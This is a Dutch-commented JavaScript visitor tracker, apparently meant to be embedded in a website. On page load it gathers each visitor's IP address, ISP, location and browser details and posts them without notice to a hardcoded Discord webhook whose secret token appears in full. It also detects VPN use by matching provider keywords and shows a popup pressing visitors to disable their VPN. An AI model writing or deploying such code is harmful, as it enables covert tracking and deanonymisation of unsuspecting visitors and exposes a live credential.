// Discord webhook URL
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1348762922960027730/KiCxIrTuv5bihTxm6-1PmuWmWdpTZWG5r2Q2IKvYkIG9f-DWv_Uq8pNhcBOYPkjnscVt';

// Functie om IP informatie op te halen
async function getIPInfo() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const ipData = await response.json();
        
        // Haal extra IP informatie op
        const detailResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        const details = await detailResponse.json();
        
        return {
            ip: ipData.ip,
            provider: details.org,
            hostname: details.hostname || 'Niet beschikbaar',
            socket: `${details.ip}:${location.port || '80'}`,
            country: details.country_name || 'Onbekend',
            city: details.city || 'Onbekend',
            isp: details.org || 'Onbekend'
        };
    } catch (error) {
        console.error('Fout bij ophalen IP informatie:', error);
        return {
            ip: 'Niet beschikbaar',
            provider: 'Niet beschikbaar',
            hostname: 'Niet beschikbaar',
            socket: 'Niet beschikbaar',
            country: 'Onbekend',
            city: 'Onbekend',
            isp: 'Onbekend'
        };
    }
}

// Functie om te controleren of een gebruiker een VPN gebruikt
async function checkVPN(ipInfo) {
    try {
        // Controleer op bekende VPN-providers in de ISP naam
        const vpnKeywords = [
            'vpn', 'proxy', 'tunnel', 'tor', 'anonymous', 'hide', 'private network',
            'nordvpn', 'expressvpn', 'cyberghost', 'protonvpn', 'surfshark', 'privatevpn',
            'mullvad', 'ipvanish', 'purevpn', 'hotspot shield', 'tunnelbear', 'windscribe',
            'avast secureline', 'norton secure', 'kaspersky', 'f-secure', 'avira phantom',
            'digital ocean', 'linode', 'aws', 'amazon', 'azure', 'google cloud', 'oracle cloud',
            'hosting', 'datacenter', 'data center'
        ];
        
        // Controleer of de ISP naam een van de VPN-keywords bevat
        const ispLower = ipInfo.isp.toLowerCase();
        const isVPN = vpnKeywords.some(keyword => ispLower.includes(keyword));
        
        // Controleer of het land verschilt van de verwachte locatie (optioneel)
        // Dit zou je kunnen uitbreiden met een database van verwachte landen per regio
        
        return isVPN;
    } catch (error) {
        console.error('Fout bij controleren VPN:', error);
        return false;
    }
}

// Functie om de VPN-popup te tonen
function showVPNPopup() {
    // Controleer of de popup al bestaat
    if (document.getElementById('vpn-popup')) {
        return;
    }
    
    // Maak de popup container
    const popup = document.createElement('div');
    popup.id = 'vpn-popup';
    popup.className = 'vpn-popup';
    
    // Voeg de popup inhoud toe
    popup.innerHTML = `
        <div class="vpn-popup-content">
            <h2>VPN Gedetecteerd</h2>
            <p>We hebben gedetecteerd dat u mogelijk een VPN of proxy gebruikt. Voor de beste ervaring op onze website, zou u deze kunnen uitschakelen.</p>
            <div class="vpn-popup-buttons">
                <button id="vpn-disable-btn" class="vpn-btn vpn-primary-btn">VPN Uitschakelen</button>
                <button id="vpn-continue-btn" class="vpn-btn vpn-secondary-btn">Nee, ik wil niet</button>
            </div>
        </div>
    `;
    
    // Voeg de popup toe aan de body
    document.body.appendChild(popup);
    
    // Voeg event listeners toe aan de knoppen
    document.getElementById('vpn-disable-btn').addEventListener('click', () => {
        // Hier zou je een redirect kunnen doen naar een pagina met instructies
        // voor het uitschakelen van VPN, maar voor nu sluiten we gewoon de popup
        closeVPNPopup();
    });
    
    document.getElementById('vpn-continue-btn').addEventListener('click', () => {
        closeVPNPopup();
    });
    
    // Toon de popup met een fade-in effect
    setTimeout(() => {
        popup.classList.add('show');
    }, 100);
}

// Functie om de VPN-popup te sluiten
function closeVPNPopup() {
    const popup = document.getElementById('vpn-popup');
    if (popup) {
        popup.classList.remove('show');
        // Verwijder de popup na de fade-out animatie
        setTimeout(() => {
            popup.remove();
        }, 300);
    }
}

// Functie om browser informatie te verzamelen
function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browserName = 'Onbekend';
    let browserCodeName = navigator.appCodeName;
    let browserVersion = 'Onbekend';
    
    // Detecteer browser naam en versie
    if (ua.includes('Firefox/')) {
        browserName = 'Firefox';
        browserVersion = ua.split('Firefox/')[1];
    } else if (ua.includes('Chrome/')) {
        browserName = 'Chrome';
        browserVersion = ua.split('Chrome/')[1].split(' ')[0];
    } else if (ua.includes('Safari/') && !ua.includes('Chrome')) {
        browserName = 'Safari';
        browserVersion = ua.split('Version/')[1].split(' ')[0];
    } else if (ua.includes('Edge/')) {
        browserName = 'Edge';
        browserVersion = ua.split('Edge/')[1];
    }

    return {
        name: browserName,
        codeName: browserCodeName,
        version: browserVersion,
        userAgent: ua
    };
}

// Functie om gegevens naar Discord te sturen
async function sendToDiscord(ipInfo, browserInfo, isVPN) {
    const embed = {
        title: '🔍 Nieuwe Bezoeker Gedetecteerd',
        color: isVPN ? 15158332 : 3447003, // Rood als VPN, blauw als geen VPN
        fields: [
            {
                name: '🌐 Internet & IP Informatie',
                value: `**IP Adres:** ${ipInfo.ip}\n**Provider:** ${ipInfo.provider}\n**Hostname:** ${ipInfo.hostname}\n**Socket:** ${ipInfo.socket}\n**Land:** ${ipInfo.country}\n**Stad:** ${ipInfo.city}\n**ISP:** ${ipInfo.isp}\n**VPN Gedetecteerd:** ${isVPN ? '✅ Ja' : '❌ Nee'}`,
                inline: false
            },
            {
                name: '🖥️ Browser Informatie',
                value: `**Browser:** ${browserInfo.name}\n**Code Naam:** ${browserInfo.codeName}\n**Versie:** ${browserInfo.version}\n**User Agent:** ${browserInfo.userAgent}`,
                inline: false
            }
        ],
        timestamp: new Date().toISOString()
    };

    try {
        await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ embeds: [embed] })
        });
    } catch (error) {
        console.error('Fout bij verzenden naar Discord:', error);
    }
}

// Start tracking wanneer de pagina geladen is
document.addEventListener('DOMContentLoaded', async () => {
    const ipInfo = await getIPInfo();
    const browserInfo = getBrowserInfo();
    const isVPN = await checkVPN(ipInfo);
    
    // Stuur informatie naar Discord
    await sendToDiscord(ipInfo, browserInfo, isVPN);
    
    // Toon de VPN-popup als een VPN is gedetecteerd
    if (isVPN) {
        showVPNPopup();
    }
}); 